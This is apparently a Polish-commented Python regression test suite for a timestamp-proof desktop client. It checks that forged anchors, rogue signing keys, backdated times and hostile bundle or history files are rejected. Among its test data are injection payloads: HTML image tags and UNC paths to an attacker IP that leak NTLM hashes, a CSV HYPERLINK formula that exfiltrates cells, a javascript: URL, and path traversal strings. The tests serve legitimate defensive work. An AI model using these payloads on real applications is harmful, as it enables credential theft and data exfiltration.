"""
Testy regresyjne podatności znalezionych w przeglądzie bezpieczeństwa.

Każdy test odtwarza konkretny atak, który przechodził przed poprawką. To nie
są testy „czy funkcja zwraca prawdę dla poprawnych danych" — funkcja zwracająca
zawsze `True` przeszłaby takie bez trudu. Tu sprawdzamy, że **spreparowane**
dane są ODRZUCANE, bo to jest jedyna własność, która ma tu wartość.

Model zagrożeń, z którego wyrastają te testy:
  (a) złośliwy albo przejęty serwer (sigelith.org / beattime.live) — cały sens aplikacji polega
      na tym, że NIE musi mu ufać;
  (b) plik `.beatproof` otrzymany od kogoś obcego;
  (c) podmieniony `history.json` / `settings.json` w katalogu danych;
  (d) złośliwe nazwy plików i notatki trafiające do PDF-a i do arkusza CSV.
"""
from __future__ import annotations

import base64
import json
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.path.insert(0, str(Path(__file__).resolve().parent))

from beatstamp import bundle, certificate, i18n, merkle, proof  # noqa: E402
from beatstamp.config import Settings  # noqa: E402
from beatstamp.history import Entry, History  # noqa: E402

# Jezyk interfejsu PRZYPIETY. Testy sprawdzaja ZNACZENIE napisu — oczekiwany
# tekst bierzemy z tego samego katalogu tlumaczen, ktorego uzywa program
# (`_('<msgid>')`), a nie z przepisanego recznie ciagu znakow. Bez przypiecia
# wynik suite zalezalby od jezyka interfejsu maszyny, na ktorej akurat sie ja
# uruchamia; bez katalogu — sprawdzalibysmy literowke, a nie tresc.
i18n.set_language('pl')
_ = i18n.gettext


DIGEST = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'


def payload(**overrides) -> dict:
    """Odpowiedź serwera bez ŻADNEGO materiału kryptograficznego."""
    base = {
        'found': True, 'digest': DIGEST, 'beat': '@500.00',
        'utc': '2019-01-01T12:00:00Z', 'seq': 1,
        'week': '2019-W01', 'week_closed': False,
    }
    base.update(overrides)
    return base


class ForgedAnchorTests(unittest.TestCase):
    """Podatność 1 (krytyczna): poziom dowodu z niesprawdzonych pól.

    Przed poprawką `verify_payload` ustawiał ZAKOTWICZONY na podstawie samego
    napisu `ots_status: "bitcoin"` w odpowiedzi. Serwer mógł więc odpowiedzieć
    BEZ korzenia, bez ścieżki inkluzji i bez podpisu — nie było czego
    sprawdzać, więc nie było też zastrzeżeń — a aplikacja pokazywała zieloną
    plakietkę „Najwyższy poziom" i wystawiała certyfikat PDF z napisem
    „potwierdzony — blok Bitcoin". Przypięty klucz nie chronił przed niczym,
    bo gałąź, która go sprawdza, nie była w ogóle osiągana.
    """

    def test_claimed_bitcoin_anchor_does_not_raise_level(self):
        r = proof.verify_payload(payload(ots_status='bitcoin',
                                         ots_bitcoin_height=558000),
                                 expected_digest=DIGEST)
        self.assertIs(r.level, proof.Level.RECORDED,
                      'sam napis od serwera nie może dawać poziomu ZAKOTWICZONY')
        self.assertTrue(r.warnings, 'użytkownik musi zobaczyć, że nie dało się tego sprawdzić')

    def test_claimed_bank_anchor_does_not_raise_level(self):
        r = proof.verify_payload(
            payload(anchors=[{'bank': 'Bank', 'status': 'confirmed',
                              'date': '2019-01-08'}]),
            expected_digest=DIGEST)
        self.assertIs(r.level, proof.Level.RECORDED)

    def test_closed_week_without_proof_is_not_trusted(self):
        """Zamknięty tydzień ma już zamrożony i podpisany korzeń.

        Brak ścieżki inkluzji albo podpisu nie jest tu stanem przejściowym —
        jest sprzecznością, a „nie było czego sprawdzić" nie może znaczyć
        „sprawdzono i jest dobrze".
        """
        r = proof.verify_payload(payload(week_closed=True), expected_digest=DIGEST)
        self.assertFalse(r.trusted)

    def test_open_week_without_proof_is_honest_but_lowest_level(self):
        """Świeży stempel: brak podpisu jest normalny — ale poziom najniższy."""
        r = proof.verify_payload(payload(), expected_digest=DIGEST)
        self.assertTrue(r.trusted, 'brak sprzeczności = brak alarmu')
        self.assertIs(r.level, proof.Level.RECORDED)

    def test_anchor_raises_level_only_above_verified_proof(self):
        """Prawdziwy, w pełni zweryfikowany dowód nadal osiąga ZAKOTWICZONY."""
        from test_core import LIVE_PAYLOAD
        r = proof.verify_payload(LIVE_PAYLOAD, expected_digest=LIVE_PAYLOAD['digest'])
        self.assertIs(r.level, proof.Level.ANCHORED)
        self.assertTrue(r.trusted)

    def test_anchor_claim_with_broken_signature_stays_recorded(self):
        """Podpis się nie zgadza → kotwica nie ma czego podnosić."""
        from test_core import LIVE_PAYLOAD
        tampered = dict(LIVE_PAYLOAD)
        sig = tampered['root_signature']
        tampered['root_signature'] = ('A' if sig[0] != 'A' else 'B') + sig[1:]
        r = proof.verify_payload(tampered, expected_digest=LIVE_PAYLOAD['digest'])
        self.assertIs(r.level, proof.Level.RECORDED)
        self.assertFalse(r.trusted)

    def test_rogue_key_with_valid_signature_stays_recorded(self):
        """Serwer z własną parą kluczy: podpis poprawny, ale klucz obcy."""
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
        from test_core import LIVE_PAYLOAD

        rogue = Ed25519PrivateKey.generate()
        message = f"beattime-proof-v1|{LIVE_PAYLOAD['week']}|{LIVE_PAYLOAD['week_root']}"
        tampered = dict(LIVE_PAYLOAD)
        tampered['root_signature'] = base64.b64encode(rogue.sign(message.encode())).decode()
        tampered['public_key'] = base64.b64encode(rogue.public_key().public_bytes(
            serialization.Encoding.Raw, serialization.PublicFormat.Raw)).decode()
        tampered['ots_status'] = 'bitcoin'

        r = proof.verify_payload(tampered, expected_digest=LIVE_PAYLOAD['digest'])
        self.assertTrue(r.signature_ok, 'podpis jest poprawny WŁASNYM kluczem')
        self.assertFalse(r.key_pinned_ok)
        self.assertIs(r.level, proof.Level.RECORDED)
        self.assertFalse(r.trusted)


class MarkupInjectionTests(unittest.TestCase):
    """Podatności 2 i 3: znaczniki przemycone w polach z sieci albo z pliku.

    Zarówno `Paragraph` reportlaba, jak i etykiety Qt w trybie `AutoText`
    interpretują HTML — łącznie z `<img src=...>`, który powoduje pobranie
    wskazanego zasobu. Na Windows ścieżka UNC `//host/udział/x.png` dokłada do
    tego uwierzytelnienie SMB, czyli wyciek nazwy konta i skrótu NTLM.
    """

    PAYLOADS = (
        '<img src="//198.51.100.7/s/a.png"/>',
        '<img src="http://198.51.100.7/beacon"/>',
        '<a href="file:///c:/windows/win.ini">x</a>',
        '</b><font color="green">ZWERYFIKOWANY</font>',
    )

    def test_week_root_with_markup_is_rejected_loudly(self):
        for evil in self.PAYLOADS:
            r = proof.verify_payload(payload(week_root=evil.lower()),
                                     expected_digest=DIGEST)
            self.assertEqual(r.week_root, '', f'przepuszczono: {evil}')
            self.assertTrue(r.problems, 'odrzucenie musi być GŁOŚNE')

    def test_display_fields_with_markup_are_dropped(self):
        for evil in self.PAYLOADS:
            r = proof.verify_payload(
                payload(beat=evil, week=evil, ots_status=evil,
                        utc=evil, public_key=evil, chain_hash=evil),
                expected_digest=DIGEST)
            for name in ('beat', 'week', 'utc', 'public_key', 'chain_hash'):
                self.assertNotIn('<', getattr(r, name), f'{name} przepuściło: {evil}')
            self.assertEqual(r.ots_status, 'none')

    def test_valid_fields_survive_validation(self):
        """Walidacja nie może odrzucać prawdziwych danych."""
        from test_core import LIVE_PAYLOAD
        r = proof.verify_payload(LIVE_PAYLOAD, expected_digest=LIVE_PAYLOAD['digest'])
        self.assertEqual(r.beat, LIVE_PAYLOAD['beat'])
        self.assertEqual(r.week, LIVE_PAYLOAD['week'])
        self.assertEqual(r.utc, LIVE_PAYLOAD['utc'])
        self.assertEqual(r.public_key, LIVE_PAYLOAD['public_key'])
        self.assertEqual(r.ots_status, 'bitcoin')

    def test_pdf_escapes_every_attacker_controlled_field(self):
        """Certyfikat składa się bez wstawienia surowego znacznika.

        Droga przez `history.json` omija walidację z `proof.py` (plik mógł
        zostać podmieniony), więc PDF musi bronić się sam.
        """
        evil = '<img src="//198.51.100.7/s/a.png"/>'
        entry = Entry(
            digest=evil, file_name=evil, note=evil, week=evil,
            week_root=evil, public_key=evil, beat=evil,
            anchors=[{'bank': evil, 'date': evil, 'status': evil,
                      'bank_reference': evil}],
            level='anchored', ots_status='bitcoin', ots_height=1)
        pdf = certificate.build_certificate(entry)
        self.assertTrue(pdf.startswith(b'%PDF'))
        self.assertNotIn(b'<img', pdf)

    def test_reportlab_network_and_disk_access_is_disabled(self):
        """Obrona w głąb: reportlab nie ma prawa sięgnąć po zasób zewnętrzny."""
        import reportlab.rl_config as rl
        self.assertEqual(rl.trustedHosts, [], 'każdy host byłby zaufany')
        self.assertEqual(rl.trustedSchemes, [], 'file/http/https byłyby dozwolone')

    def test_time_row_escapes_values(self):
        """Wiersz „@beat · czas" w oknie głównym nie może nieść znacznika."""
        import os
        os.environ.setdefault('QT_QPA_PLATFORM', 'offscreen')
        from beatstamp.ui.main_window import _time_html
        for evil in self.PAYLOADS:
            out = _time_html(evil, evil)
            self.assertNotIn('<img', out)
            self.assertNotIn('<a ', out)
            self.assertNotIn('</b><font', out)


class CsvInjectionTests(unittest.TestCase):
    """Podatność 4: formuły w eksporcie CSV.

    Komórka zaczynająca się od `=`, `+`, `-`, `@`, tabulatora albo CR jest
    w Excelu i LibreOffice FORMUŁĄ. Notatka `=HYPERLINK("http://cudzy/?d="&A2)`
    zamienia się po otwarciu pliku w odnośnik wysyłający sąsiednie kolumny —
    skrót i czas stempla — na cudzy serwer.
    """

    DANGEROUS = (
        '=HYPERLINK("http://198.51.100.7/?d="&A2,"Otwórz dowód")',
        '+1+1',
        '-2+3',
        '@SUM(A1:A9)',
        '\tcmd',
        '\rcmd',
    )

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self._tmp.name)

    def tearDown(self):
        self._tmp.cleanup()

    def test_formula_prefixes_are_neutralised(self):
        history = History(self.dir / 'history.json')
        for i, evil in enumerate(self.DANGEROUS):
            history.entries.append(Entry(digest=f'{i:064x}', note=evil,
                                         file_name=evil, utc='2026-09-12T10:00:00Z'))
        target = self.dir / 'eksport.csv'
        history.export_csv(target)

        text = target.read_text(encoding='utf-8-sig')
        for line in text.splitlines()[1:]:
            for cell in line.split(';'):
                cell = cell.strip('"')
                self.assertNotIn(cell[:1], ('=', '+', '-', '@', '\t', '\r'),
                                 f'komórka nadal jest formułą: {cell[:40]!r}')

    def test_ordinary_text_is_untouched(self):
        """Neutralizacja nie może psuć zwykłych notatek."""
        history = History(self.dir / 'history.json')
        history.entries.append(Entry(digest='a' * 64, note='umowa z klientem',
                                     file_name='raport 2026.pdf',
                                     utc='2026-09-12T10:00:00Z'))
        target = self.dir / 'eksport.csv'
        history.export_csv(target)
        text = target.read_text(encoding='utf-8-sig')
        self.assertIn('umowa z klientem', text)
        self.assertIn('raport 2026.pdf', text)
        self.assertNotIn("'umowa", text)


class TransportTests(unittest.TestCase):
    """Podatność 5: proxy spoza tego komputera przy wyłączonym TLS."""

    def test_loopback_proxy_recognised(self):
        for address in ('socks5h://127.0.0.1:9050', 'socks5h://localhost:9150',
                        'socks5://127.0.0.1:9050', 'socks5h://[::1]:9050'):
            self.assertTrue(Settings(tor_proxy=address).tor_proxy_is_local, address)

    def test_remote_proxy_flagged(self):
        for address in ('socks5h://198.51.100.7:1080', 'socks5h://evil.example:9050',
                        'http://10.0.0.5:8080', 'nonsens'):
            self.assertFalse(Settings(tor_proxy=address).tor_proxy_is_local, address)

    def test_clearnet_always_verifies_tls(self):
        settings = Settings(use_tor=False)
        self.assertIsInstance(settings.verify_tls, str)
        self.assertTrue(Path(settings.verify_tls).exists())

    def test_plain_http_is_refused_on_clearnet(self):
        from beatstamp.api import ApiError, BeatTimeClient
        client = BeatTimeClient(Settings(base_url='http://beattime.live'))
        try:
            with self.assertRaises(ApiError):
                client.verify('a' * 64)
        finally:
            client.close()


class HostileBundleTests(unittest.TestCase):
    """Model zagrożeń (b): plik `.beatproof` od kogoś obcego."""

    def test_bundle_without_signature_is_never_ok(self):
        data = bundle.build(proof.verify_payload(payload(), expected_digest=DIGEST))
        data['ots_status'] = 'bitcoin'
        data['level'] = 'anchored'          # atakujący wpisuje, co chce
        check = bundle.check(data, document_digest=DIGEST)
        self.assertFalse(check.ok, 'bez podpisu dowód nie może być uznany')

    def test_bundle_with_rogue_key_is_rejected(self):
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
        from test_core import LIVE_PAYLOAD

        rogue = Ed25519PrivateKey.generate()
        week, root = LIVE_PAYLOAD['week'], LIVE_PAYLOAD['week_root']
        data = bundle.build(proof.verify_payload(LIVE_PAYLOAD,
                                                 expected_digest=LIVE_PAYLOAD['digest']))
        data['root_signature'] = base64.b64encode(
            rogue.sign(f'beattime-proof-v1|{week}|{root}'.encode())).decode()
        data['public_key'] = base64.b64encode(rogue.public_key().public_bytes(
            serialization.Encoding.Raw, serialization.PublicFormat.Raw)).decode()

        check = bundle.check(data, document_digest=LIVE_PAYLOAD['digest'])
        self.assertFalse(check.ok)
        self.assertFalse(check.key_pinned_ok)

    def test_oversized_bundle_refused(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / 'wielki.beatproof'
            path.write_text('{"a":"' + 'x' * (5 * 1024 * 1024) + '"}', encoding='utf-8')
            with self.assertRaises(ValueError):
                bundle.load(path)

    def test_non_json_bundle_refused(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / 'zly.beatproof'
            path.write_bytes(b'\x00\x01 to nie jest json')
            with self.assertRaises(ValueError):
                bundle.load(path)


class NetworkInputTests(unittest.TestCase):
    """Do sieci nie wychodzi nic poza zwalidowanym skrótem."""

    def test_only_validated_digest_reaches_the_wire(self):
        from beatstamp.api import ApiError, BeatTimeClient
        client = BeatTimeClient(Settings())
        try:
            for bad in ('', 'abc', '../../etc/passwd', 'z' * 64,
                        DIGEST + '/../../x', None, 12345):
                with self.assertRaises(ApiError, msg=f'przepuszczono {bad!r}'):
                    client.verify(bad)
                with self.assertRaises(ApiError, msg=f'przepuszczono {bad!r}'):
                    client.stamp(bad)
        finally:
            client.close()

    def test_digest_is_normalised_before_sending(self):
        self.assertTrue(merkle.is_digest(DIGEST.upper()))
        from beatstamp.api import _require_digest
        self.assertEqual(_require_digest(f'  {DIGEST.upper()}  '), DIGEST)


class HostileHistoryFileTests(unittest.TestCase):
    """Model zagrożeń (c): podmieniony `history.json`."""

    def test_entry_from_hostile_json_does_not_crash_pdf(self):
        raw = json.loads(json.dumps({
            'digest': {'nie': 'napis'}, 'file_size': 'duzo',
            'seq': [1, 2, 3], 'anchors': 'nie lista',
            'inclusion_proof': {'nie': 'lista'}, 'legacy': 'nie slownik',
            'week_closed': 'tak',
        }))
        entry = Entry.from_dict(raw)
        if entry is not None:
            certificate.build_certificate(entry)     # nie może rzucić wyjątkiem

    def test_broken_entries_do_not_invalidate_history(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / 'history.json'
            good = Entry(digest='a' * 64, utc='2026-09-12T10:00:00Z').to_dict()
            path.write_text(json.dumps([good, None, 42, 'tekst', [], good]),
                            encoding='utf-8')
            history = History(path).load()
            self.assertEqual(len(history.entries), 2)


def _with_time(base: dict, utc: str) -> dict:
    """Kopia odpowiedzi z innym `utc` i PASUJACYM do niego `beat`.

    Podpis obejmuje tylko `tydzien|korzen`, wiec po tej zmianie pozostaje
    matematycznie poprawny — dokladnie tak jak w ataku.
    """
    from beatstamp import beatcore
    out = json.loads(json.dumps(base))
    dt = beatcore.parse_iso_utc(utc)
    out['utc'] = utc
    out['beat'] = beatcore.format_beat(beatcore.beats_from_utc(dt), decimals=2)
    return out


class BackdatedTimeTests(unittest.TestCase):
    """Podatność 6 (wysoka): czas dowodu spoza podpisu.

    Podpis obejmuje `beattime-proof-v1|tydzień|korzeń`, liść drzewa — sam
    skrót. `utc`, `beat` i `seq` nie były sprawdzane: `.beatproof` (albo
    odpowiedź serwera) z `utc` przestawionym na 2019 rok dostawał zieloną
    plakietkę „Zweryfikowany offline", a zmyślona data szła do historii
    i do certyfikatu PDF.
    """

    def setUp(self):
        from test_core import LIVE_PAYLOAD
        self.live = LIVE_PAYLOAD
        self.digest = LIVE_PAYLOAD['digest']

    def test_backdated_server_reply_is_rejected(self):
        forged = json.loads(json.dumps(self.live))
        forged.update(utc='2019-01-01T00:00:00Z', beat='@041.66')
        r = proof.verify_payload(forged, expected_digest=self.digest)
        self.assertTrue(r.signature_ok and r.inclusion_ok, 'podpis dalej się zgadza')
        self.assertTrue(any('poza tygodniem 2026-W25' in p for p in r.problems), r.problems)
        self.assertIs(r.level, proof.Level.RECORDED)
        self.assertFalse(r.trusted)

    def test_backdated_bundle_is_rejected(self):
        data = bundle.build(proof.verify_payload(self.live, expected_digest=self.digest))
        data.update(utc='2019-01-01T00:00:00Z', beat='@041.66')
        check = bundle.check(data, document_digest=self.digest)
        self.assertTrue(check.signature_ok and check.inclusion_ok and check.key_pinned_ok)
        self.assertFalse(check.ok, 'zmyślona data nie może dać „Zweryfikowany offline"')
        self.assertTrue(any('poza tygodniem' in p for p in check.problems), check.problems)

    def test_beat_must_match_utc(self):
        forged = json.loads(json.dumps(self.live))
        forged['beat'] = '@041.66'
        r = proof.verify_payload(forged, expected_digest=self.digest)
        self.assertTrue(any('@041.66' in p and '@348.28' in p for p in r.problems), r.problems)
        self.assertIs(r.level, proof.Level.RECORDED)

        data = bundle.build(proof.verify_payload(self.live, expected_digest=self.digest))
        data['beat'] = '@041.66'
        self.assertFalse(bundle.check(data, document_digest=self.digest).ok)

    def test_beat_without_date_is_rejected_in_bundle(self):
        data = bundle.build(proof.verify_payload(self.live, expected_digest=self.digest))
        data['utc'] = ''
        check = bundle.check(data, document_digest=self.digest)
        self.assertFalse(check.ok)
        self.assertTrue(any('bez daty' in p for p in check.problems), check.problems)

    def test_unparseable_time_in_bundle_is_rejected(self):
        for bad in ('2019-01-01', 'wczoraj', '2026-13-45T00:00:00Z'):
            data = bundle.build(proof.verify_payload(self.live, expected_digest=self.digest))
            data['utc'] = bad
            check = bundle.check(data, document_digest=self.digest)
            self.assertFalse(check.ok, bad)

    def test_other_moment_inside_the_week_is_accepted(self):
        """Kontrola nie jest nadgorliwa: każda chwila tygodnia przechodzi."""
        for utc in ('2026-06-15T00:00:00Z', '2026-06-18T12:00:00Z',
                    '2026-06-21T23:59:59.999999Z'):
            r = proof.verify_payload(_with_time(self.live, utc), expected_digest=self.digest)
            self.assertEqual(r.problems, [], utc)
            self.assertIs(r.level, proof.Level.ANCHORED, utc)

    def test_week_boundary_race_is_tolerated_but_bounded(self):
        """Stempel z ostatnich sekund zamkniętego tygodnia trafia do następnego."""
        ok = proof.verify_payload(_with_time(self.live, '2026-06-14T23:57:00Z'),
                                  expected_digest=self.digest)
        self.assertEqual(ok.problems, [])
        for utc in ('2026-06-14T23:00:00Z', '2026-06-22T00:00:00Z'):
            r = proof.verify_payload(_with_time(self.live, utc), expected_digest=self.digest)
            self.assertTrue(r.problems, utc)
            self.assertIs(r.level, proof.Level.RECORDED, utc)

    def test_problem_text_never_echoes_raw_bundle_values(self):
        """Zastrzeżenia trafiają do etykiet z tekstem wzbogaconym."""
        data = bundle.build(proof.verify_payload(self.live, expected_digest=self.digest))
        data.update(utc='<img src="//198.51.100.7/a.png"/>', beat='<b>x</b>')
        check = bundle.check(data, document_digest=self.digest)
        self.assertFalse(check.ok)
        for problem in check.problems:
            self.assertNotIn('<', problem)

    def test_week_helpers(self):
        self.assertEqual(proof.week_range_text('2026-W25'), '15.06–21.06.2026')
        self.assertEqual(proof.week_range_text('2026-W01'), '29.12.2025–04.01.2026')
        self.assertEqual(proof.week_end_text('2026-W25'), '22.06.2026, 00:00 UTC')
        self.assertIsNone(proof.week_bounds('2026-W60'))
        self.assertIsNone(proof.week_bounds('<b>'))


class AnchorRootTests(unittest.TestCase):
    """Podatność (niska): kotwica bankowa dla dowolnego korzenia.

    Poziom ZAKOTWICZONY liczył każdą kotwicę `confirmed`, bez sprawdzenia jej
    pola `root`. Pośrednik przekazujący prawdziwe, podpisane dane mógł
    dopisać „kotwicę" i podnieść PODPISANY do ZAKOTWICZONY — a PDF pisał
    „Kotwica bankowa … potwierdzona".
    """

    def setUp(self):
        from test_core import LIVE_PAYLOAD
        self.base = json.loads(json.dumps(LIVE_PAYLOAD))
        self.base['ots_status'] = 'pending'
        self.digest = LIVE_PAYLOAD['digest']
        self.root = LIVE_PAYLOAD['week_root']

    def _level(self, anchor):
        payload = json.loads(json.dumps(self.base))
        payload['anchors'] = [anchor]
        return proof.verify_payload(payload, expected_digest=self.digest)

    def test_anchor_for_another_root_does_not_count(self):
        r = self._level({'bank': 'Fake Bank', 'status': 'confirmed', 'date': '2026-06-23',
                         'root': '00' * 32, 'root_matches_week': False})
        self.assertIs(r.level, proof.Level.SIGNED)
        self.assertTrue(any('innego korzenia' in w for w in r.warnings), r.warnings)
        self.assertIn('nieuznana', r.anchor_summary)

    def test_server_saying_root_does_not_match_is_believed(self):
        r = self._level({'bank': 'Bank', 'status': 'confirmed', 'root': self.root,
                         'root_matches_week': False})
        self.assertIs(r.level, proof.Level.SIGNED)

    def test_anchor_without_root_does_not_count(self):
        r = self._level({'bank': 'Bank', 'status': 'confirmed'})
        self.assertIs(r.level, proof.Level.SIGNED)

    def test_matching_anchor_still_anchors(self):
        r = self._level({'bank': 'Bank', 'status': 'confirmed', 'root': self.root.upper(),
                         'root_matches_week': True})
        self.assertIs(r.level, proof.Level.ANCHORED)
        self.assertEqual(r.warnings, [])

    def test_pending_anchor_does_not_count(self):
        r = self._level({'bank': 'Bank', 'status': 'pending', 'root': self.root})
        self.assertIs(r.level, proof.Level.SIGNED)


class CertificateTrustTests(unittest.TestCase):
    """Podatność 7 (średnia): PDF dla dowodu odrzuconego mówił „potwierdzony".

    Podpis obcym kluczem dawał wynik ZAREJESTROWANY z zastrzeżeniem, a PDF
    z takiego wyniku pisał „tydzień jeszcze trwa" (nieprawda — zamknięty),
    „Ed25519 — korzeń podpisany", „potwierdzony — blok Bitcoin" i „Kotwica
    bankowa … potwierdzona". Nic nie mówiło o obcym kluczu.
    """

    def setUp(self):
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
        from test_core import LIVE_PAYLOAD
        from beatstamp.history import entry_from_verification
        self.digest = LIVE_PAYLOAD['digest']
        rogue = Ed25519PrivateKey.generate()
        forged = json.loads(json.dumps(LIVE_PAYLOAD))
        message = f"beattime-proof-v1|{forged['week']}|{forged['week_root']}"
        forged['root_signature'] = base64.b64encode(rogue.sign(message.encode())).decode()
        forged['public_key'] = base64.b64encode(rogue.public_key().public_bytes(
            serialization.Encoding.Raw, serialization.PublicFormat.Raw)).decode()
        self.rogue_pub = forged['public_key']
        self.rogue_result = proof.verify_payload(forged, expected_digest=self.digest)
        self.rogue = entry_from_verification(self.rogue_result)
        self.good = entry_from_verification(
            proof.verify_payload(LIVE_PAYLOAD, expected_digest=self.digest))

    def _texts(self, entry, key_override=''):
        state, _status = certificate._assess(entry, key_override)
        return {
            'level': certificate._level_line(entry, key_override)[0],
            'signature': certificate._signature_text(entry, key_override),
            'ots': certificate._ots_text(entry, state),
            'anchors': certificate._anchor_text(entry, state),
            'coverage': certificate._coverage_text(entry, state),
        }

    def test_foreign_key_certificate_says_unconfirmed(self):
        for entry in (self.rogue, self.rogue_result):
            texts = self._texts(entry)
            self.assertEqual(texts['level'], _(
                'UNCONFIRMED — root signed with a key outside the Sigelith '
                'list, signature not binding'), texts)
            self.assertEqual(texts['signature'], _(
                'Ed25519 — with a key outside the Sigelith list, signature not '
                'binding'))
            # Kotwica nie ma prawa niczego potwierdzac, gdy sam korzen nie
            # przeszedl kontroli — ani w wierszu OTS, ani w bankowym.
            not_binding = _('not binding — root without a confirmed Sigelith '
                            'signature')
            self.assertEqual(texts['ots'], not_binding)
            self.assertIn(not_binding, texts['anchors'])
            self.assertNotIn(_('confirmed according to the register'),
                             texts['anchors'])
            self.assertEqual(texts['coverage'], _(
                'none — the time comes from the register alone, without '
                'confirmation by a signature.'))
            self.assertNotEqual(texts['level'], _(
                'RECORDED — the week is still running, the anchor is on its '
                'way'))
        self.assertTrue(certificate.build_certificate(self.rogue).startswith(b'%PDF'))

    def test_verified_certificate_labels_declared_anchors(self):
        texts = self._texts(self.good)
        self.assertEqual(texts['level'], _(
            'ANCHORED — the week root is preserved outside Sigelith'))
        self.assertEqual(texts['signature'], _(
            'Ed25519 — root signed with a Sigelith key, checked locally'))
        self.assertEqual(texts['ots'], _(
            'confirmed according to the register — %(where)s%(ots)s') % {
                'where': _('Bitcoin block %(height)s')
                         % {'height': self.good.ots_height},
                'ots': _(' — .ots file for independent verification: '
                         'sigelith.org/api/proof/ots/%(week)s')
                       % {'week': self.good.week}})
        self.assertIn('/api/proof/ots/2026-W25', texts['ots'])
        self.assertIn(_('confirmed according to the register'), texts['anchors'])
        self.assertEqual(texts['coverage'], _(
            'week %(week)s (%(range)s UTC) — root signed and checked: the '
            'document existed no later than %(end)s. The exact moment within '
            'that week is given by the Sigelith register.') % {
                'week': self.good.week,
                'range': proof.week_range_text(self.good.week),
                'end': proof.week_end_text(self.good.week)})
        self.assertIn(proof.week_end_text('2026-W25'), texts['coverage'])

    def test_anchor_for_other_root_is_not_confirmed_on_pdf(self):
        entry = Entry(**{**self.good.to_dict(), 'anchors': [
            {'bank': 'Fake', 'status': 'confirmed', 'root': '00' * 32}]})
        self.assertIn(_('concerns a root other than the week root — not '
                        'accepted'), self._texts(entry)['anchors'])

    def test_stored_level_without_signature_is_not_printed(self):
        entry = Entry(**{**self.good.to_dict(), 'root_signature': ''})
        texts = self._texts(entry)
        self.assertNotIn(texts['level'], (
            _('ANCHORED — the week root is preserved outside Sigelith'),
            _('SIGNED — the week root is frozen and signed with Ed25519')), texts)
        self.assertEqual(texts['ots'], _(
            'not binding — root without a confirmed Sigelith signature'))

    def test_backdated_entry_is_not_printed_as_proof(self):
        entry = Entry(**{**self.good.to_dict(), 'utc': '2019-01-01T00:00:00Z',
                         'beat': '@041.66'})
        self.assertEqual(self._texts(entry)['level'], _(
            'UNCONFIRMED — the proof did not pass the local check'))

    def test_open_week_wording_is_unchanged(self):
        entry = Entry(digest='a' * 64, beat='@500.00', utc='2026-09-22T12:00:00Z',
                      week='2026-W39', level='recorded', verified_ok=True)
        texts = self._texts(entry)
        self.assertEqual(texts['level'], _(
            'RECORDED — the week is still running, the anchor is on its way'))
        self.assertEqual(texts['coverage'], _(
            'week %(week)s is still running — the signature will cover it once '
            'it closes; the exact time is given by the Sigelith register.')
            % {'week': entry.week})


class MarkupInjectionMoreTests(unittest.TestCase):
    """Obrona w głąb dla pól, które omijały walidator formatu."""

    EVIL = '<img src="//198.51.100.7/s/a.png"/>'

    def test_bundle_with_markup_in_week_is_rejected(self):
        from test_core import LIVE_PAYLOAD
        data = bundle.build(proof.verify_payload(LIVE_PAYLOAD,
                                                 expected_digest=LIVE_PAYLOAD['digest']))
        for field_name in ('week', 'week_root'):
            forged = dict(data, **{field_name: self.EVIL})
            check = bundle.check(forged, document_digest=LIVE_PAYLOAD['digest'])
            self.assertFalse(check.ok, field_name)
            self.assertTrue(check.problems, field_name)
            self.assertNotIn('<', check.week)
            self.assertFalse(any('<' in t for t in check.problems + check.warnings))

    def test_anchor_fields_from_server_are_validated(self):
        from test_core import LIVE_PAYLOAD
        payload = json.loads(json.dumps(LIVE_PAYLOAD))
        payload['anchors'] = [{'bank': self.EVIL, 'date': self.EVIL, 'status': self.EVIL,
                               'root': self.EVIL, 'bank_reference': self.EVIL,
                               'statement_url': 'javascript:alert(1)', 'extra': self.EVIL}]
        r = proof.verify_payload(payload, expected_digest=LIVE_PAYLOAD['digest'])
        self.assertEqual(len(r.anchors), 1)
        self.assertNotIn('<', json.dumps(r.anchors))
        self.assertNotIn('extra', r.anchors[0])
        self.assertEqual(r.anchors[0]['statement_url'], '')
        # Prawdziwa kotwica przechodzi bez zmian.
        good = proof.verify_payload(LIVE_PAYLOAD, expected_digest=LIVE_PAYLOAD['digest'])
        self.assertEqual(good.anchors[0]['bank'], 'Swissquote Bank SA (Swiss bank)')
        self.assertEqual(good.anchors[0]['bank_reference'], '1122189662')
        self.assertTrue(good.anchors[0]['root_matches_week'])

    def test_checks_text_escapes_anchor_and_warnings(self):
        """Druga warstwa: wynik zbudowany z pominięciem walidatora."""
        import os
        os.environ.setdefault('QT_QPA_PLATFORM', 'offscreen')
        from beatstamp.ui.main_window import MainWindow
        r = proof.VerificationResult(found=True, digest=DIGEST)
        r.anchors = [{'bank': self.EVIL, 'status': 'pending'}]
        r.warnings = [self.EVIL]
        out = MainWindow._checks_text(r)
        self.assertNotIn('<img', out)
        self.assertIn('&lt;img', out)

    def test_tooltips_are_never_parsed_as_markup(self):
        import os
        os.environ.setdefault('QT_QPA_PLATFORM', 'offscreen')
        from beatstamp.ui.widgets import plain_tooltip
        out = plain_tooltip(self.EVIL + '\ndruga linia')
        self.assertTrue(out.startswith('<qt>') and out.endswith('</qt>'))
        self.assertNotIn('<img', out)
        self.assertIn('<br>druga linia', out)
        self.assertEqual(plain_tooltip(''), '')


if __name__ == '__main__':
    unittest.main(verbosity=2)
